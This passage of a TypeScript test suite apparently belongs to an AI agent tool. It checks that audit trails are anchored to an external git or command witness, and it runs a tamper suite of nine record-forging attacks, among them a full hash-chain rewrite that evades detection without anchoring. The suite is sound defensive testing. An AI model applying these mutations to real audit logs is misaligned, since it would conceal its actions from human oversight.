    const verify = script("verify.mjs", `import { readFileSync } from "node:fs"; const d = readFileSync(0, "utf-8"); let have = ""; try { have = readFileSync(${w}, "utf-8"); } catch {} process.exit(have.split("\\n").includes(d) && process.env.GNOMON_ANCHOR_RECEIPT === "witness-receipt:" + d.slice(0, 8) ? 0 : 1);`);
    const c = cfg({ backend: "cmd", command, verify });
    const p = sealTrail(c, "s1");
    expect(await flushAnchors(anchorOf(c))).toMatchObject({ delivered: 1, pending: 0 });
    expect((await report(c, [p])).trails[0]!.status).toBe("anchored");

    // The witness lost it: the receipt no longer verifies.
    writeFileSync(witness(), "");
    expect((await report(c, [p])).trails[0]!.status).toBe("invalid");
  });

  it("a failing command leaves the head queued; no verifier means unchecked", async () => {
    const c1 = cfg({ backend: "cmd", command: "exit 3" });
    sealTrail(c1, "s1");
    const r = await flushAnchors(anchorOf(c1));
    expect(r).toMatchObject({ delivered: 0, pending: 1 });
    expect(r.error).toMatch(/exit 3/);

    const c2 = cfg({ backend: "cmd", command: "cat >/dev/null; echo ok" });
    rmSync(join(auditDir(), "anchors"), { recursive: true, force: true });
    const p = sealTrail(c2, "s2");
    await flushAnchors(anchorOf(c2));
    expect((await report(c2, [p])).trails[0]!.status).toBe("unchecked");
  });
});

// ---------------------------------------------------------------------------
// The record guard
// ---------------------------------------------------------------------------

describe("the record guard and the anchors directory", () => {
  it("a background delivery writing anchors/ mid-session is not tampering when anchoring is declared", async () => {
    const remote = bareRemote();
    mkdirSync(join(root, ".gnomon"), { recursive: true });
    const c = cfg({ backend: "git", remote });
    sealTrail(c, "earlier");
    const guard = RecordGuard.for(c);
    await flushAnchors(anchorOf(c));
    expect(readdirSync(join(auditDir(), "anchors"))).toContain("receipts.jsonl");
    expect(guard.check("between_calls")).toBeNull();
    // The checkpoint map leaves it out too, so the next session does not see it.
    const cp = writeCheckpoint(c)!;
    expect(Object.keys(JSON.parse(readFileSync(cp.map, "utf-8"))).some((k) => k.includes("anchors/"))).toBe(false);
  });

  it("without [audit.anchor], a file there is a change like any other (unchanged behaviour)", () => {
    mkdirSync(join(root, ".gnomon"), { recursive: true });
    const c = cfg();
    sealTrail(c, "earlier");
    const guard = RecordGuard.for(c);
    mkdirSync(join(auditDir(), "anchors"), { recursive: true });
    writeFileSync(join(auditDir(), "anchors", "receipts.jsonl"), "{}\n");
    expect(guard.check("between_calls")?.changes.length).toBe(1);
  });
});

// ---------------------------------------------------------------------------
// Through `gnomon task`'s entry point
// ---------------------------------------------------------------------------

describe("through runTask", () => {
  function surface(anchorToml: string): void {
    const put = (rel: string, text: string) => {
      mkdirSync(join(root, rel, ".."), { recursive: true });
      writeFileSync(join(root, rel), text, "utf-8");
    };
    put(
      ".gnomon/config.toml",
      `[defaults]\napproval = "on_write"\n\n[endpoints.local]\nurl = "http://127.0.0.1:9/api/chat"\nkind = "ollama"\n\n[audit]\nenabled = true\n\n[audit.anchor]\n${anchorToml}\n`
    );
    put(".gnomon/roles.toml", `[roles.implement]\nmodel = "stub"\nendpoint = "local"\ntools = ['read']\n`);
    put(".gnomon/tools.toml", `[[tools]]\nname = "read"\nenabled = true\n`);
    put(".gnomon/policy.toml", `[approval]\ngate = "on_write"\n`);
    put(".gnomon/system.md", "x\n");
  }

  async function task() {
    const { runTask } = await import("./prompt_loop.js");
    const { loadConfig } = await import("./config.js");
    const original = globalThis.fetch;
    const write = process.stderr.write.bind(process.stderr);
    const said: string[] = [];
    globalThis.fetch = (async () => ({ ok: true, json: async () => ({ message: { content: "done" }, eval_count: 1 }) })) as unknown as typeof fetch;
    process.stderr.write = ((chunk: unknown) => {
      said.push(String(chunk));
      return true;
    }) as typeof process.stderr.write;
    try {
      const record = await runTask(loadConfig(root), "go", { role: "implement", yes: true, verbose: false });
      return { record, stderr: said.join("") };
    } finally {
      globalThis.fetch = original;
      process.stderr.write = write;
    }
  }

  it("a task's trail and its checkpoint are queued at seal; a backlog is announced and recorded by the next task; delivery anchors them all", async () => {
    const remote = join(root, "witness.git");
    surface(`backend = "git"\nremote = "${remote.replace(/\\/g, "/")}"`);
    const { loadConfig } = await import("./config.js");
    const a = () => anchorOf(loadConfig(root));

    const first = await task();
    expect(first.record.bucket).toBe("result");
    const queued = pendingAnchors(a()).map((q) => q.statement.trail);
    expect(queued).toHaveLength(2);
    expect(queued.some((t) => /^\.gnomon-audit\/task-.*\.jsonl$/.test(t))).toBe(true);
    expect(queued.some((t) => /checkpoints\/checkpoint-/.test(t))).toBe(true);
    // Scheduled at the checkpoint, not delivered on the way.
    expect(captured.length).toBeGreaterThan(0);
    expect(first.stderr).not.toMatch(/anchor/);

    // The witness is not there yet: the delivery fails and the heads stay.
    expect((await flushAnchors(a())).error).toMatch(/unreachable/);
    const second = await task();
    expect(second.stderr).toMatch(/\[anchor\] 2 sealed trail head\(s\) .* not yet anchored to git/);
    expect(second.record.degradations).toEqual(expect.arrayContaining([expect.objectContaining({ id: "audit_anchor_queued" })]));

    git(["init", "--bare", "-q", remote]);
    expect(await flushAnchors(a())).toMatchObject({ pending: 0 });
    const trails = readdirSync(auditDir()).filter((f) => f.startsWith("task-")).map((f) => join(auditDir(), f));
    const rep = await report(loadConfig(root), trails);
    expect(rep.trails.map((t) => t.status)).toEqual(["anchored", "anchored"]);
    expect(rep.ok).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// The tamper suite, with and without the anchor
// ---------------------------------------------------------------------------

describe("auditability tamper suite (benchmarks/results/auditability-2026-11-03)", () => {
  // The nine attacks of benchmarks/results/auditability-2026-08-31/tamper.mjs,
  // verbatim. The last test below holds the names to that script, so the two
  // cannot drift apart.
  const rechainAll = (rs: AuditRecord[]) => {
    let prev: string | null = null;
    for (const r of rs) {
      r.prev = prev;
      delete r.hash;
      r.hash = recordHash(r);
      prev = r.hash;
    }
    return rs;
  };
  const ATTACKS: Array<[string, (rs: AuditRecord[]) => AuditRecord[]]> = [
    ["edit-a-field", (rs) => { rs[2]!.role = "root"; return rs; }],
    ["delete-a-record", (rs) => { rs.splice(2, 1); return rs; }],
    ["reorder-records", (rs) => { const t = rs[2]!; rs[2] = rs[3]!; rs[3] = t; return rs; }],
    ["append-forged-tail", (rs) => { const f = { ...rs[rs.length - 1]! }; f.seq = 999; f.kind = "tool_call"; f.hash = recordHash(f); rs.push(f); return rs; }],
    ["truncate-the-tail", (rs) => rs.slice(0, 3)],
    ["strip-one-hash", (rs) => { delete rs[2]!.hash; return rs; }],
    ["insert-hashless", (rs) => { const f = { ...rs[2]!, seq: 998, kind: "tool_call" as const }; delete f.hash; rs.splice(3, 0, f); return rs; }],
    ["edit-and-rehash-one", (rs) => { rs[2]!.role = "root"; delete rs[2]!.hash; rs[2]!.hash = recordHash(rs[2]!); return rs; }],
    ["full-rewrite", (rs) => { rs[2]!.role = "root"; return rechainAll(rs); }],
  ];
  const SAMPLE = join(process.cwd(), "..", "..", "benchmarks", "results", "auditability-2026-08-31", "sample-trail.jsonl");

  async function run(anchored: boolean): Promise<Array<{ attack: string; detected: boolean }>> {
    const rows: Array<{ attack: string; detected: boolean }> = [];
    for (const [name, mutate] of ATTACKS) {
      const remote = anchored ? bareRemote(`${name}.git`) : "";
      const c = anchored ? cfg({ backend: "git", remote }) : cfg();
      mkdirSync(auditDir(), { recursive: true });
      const p = join(auditDir(), `${name}.jsonl`);
      cpSync(SAMPLE, p);
      if (anchored) {
        // As AuditTrail does at seal, then delivered.
        const rs = load(p);
        enqueueAnchor(anchorOf(c), p, rs[rs.length - 1]!, rs.length);
        expect((await flushAnchors(anchorOf(c))).delivered).toBe(1);
      }
      save(p, mutate(load(p)));
      if (anchored) {
        // The attacker knows about anchoring: the local anchor state goes too.
        rmSync(join(auditDir(), "anchors"), { recursive: true, force: true });
      }
      const v = verifyTrail(p);
      let detected = !v.ok || v.sealed === false;
      if (anchored) {
        const t = (await report(c, [p])).trails[0]!;
        detected ||= t.status === "rechained" || t.status === "invalid";
      }
      rows.push({ attack: name, detected });
    }
    return rows;
  }

  it("anchoring off: 8/9, the full re-chain undetected (unchanged)", async () => {
    const rows = await run(false);
    expect(rows.filter((r) => r.detected).length).toBe(8);
    expect(rows.find((r) => !r.detected)?.attack).toBe("full-rewrite");
  });

  it("anchoring on (git witness, attacker wipes the local anchor state): 9/9", async () => {
    const rows = await run(true);
    expect(rows.filter((r) => r.detected).map((r) => r.attack)).toEqual(ATTACKS.map(([n]) => n));
  });

  it("the attack list is the benchmark's", () => {
    const script = readFileSync(join(process.cwd(), "..", "..", "benchmarks", "results", "auditability-2026-08-31", "tamper.mjs"), "utf-8");
    const names = [...script.matchAll(/^\s+\["([a-z-]+)",/gm)].map((m) => m[1]);
    expect(names).toEqual(ATTACKS.map(([n]) => n));
  });
});

describe("conformance/audit_anchor.json", () => {
  it("statement keys, receipt keys, backends and the degradation id match the fixture", async () => {
    const fx = JSON.parse(readFileSync(join(process.cwd(), "..", "..", "conformance", "audit_anchor.json"), "utf-8"));
    const { ANCHOR_BACKENDS } = await import("./anchor.js");
    const { DEGRADATION_IDS } = await import("./degradation.js");
    expect([...ANCHOR_BACKENDS]).toEqual(fx.backends);
    expect(ANCHOR_FORMAT).toBe(fx.statement_format);
    expect(DEGRADATION_IDS).toContain(fx.degradation_id);

    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    sealTrail(c, "s1");
    const q = pendingAnchors(anchorOf(c))[0]!;
    expect(Object.keys(q.statement).sort()).toEqual([...fx.statement_keys].sort());
    expect(Object.keys(q).sort()).toEqual([...fx.queue_entry_keys].sort());
    await flushAnchors(anchorOf(c));
    const rec = JSON.parse(readFileSync(join(auditDir(), "anchors", "receipts.jsonl"), "utf-8").trim());
    expect(Object.keys(rec).sort()).toEqual([...fx.receipt_keys].sort());
    expect(Object.keys(rec.receipt).sort()).toEqual([...fx.receipt_by_backend.git].sort());
    const tip = git(["--git-dir", remote, "rev-parse", fx.git.default_ref]);
    expect(git(["--git-dir", remote, "ls-tree", "--name-only", tip])).toBe(fx.git.file);
  });
});
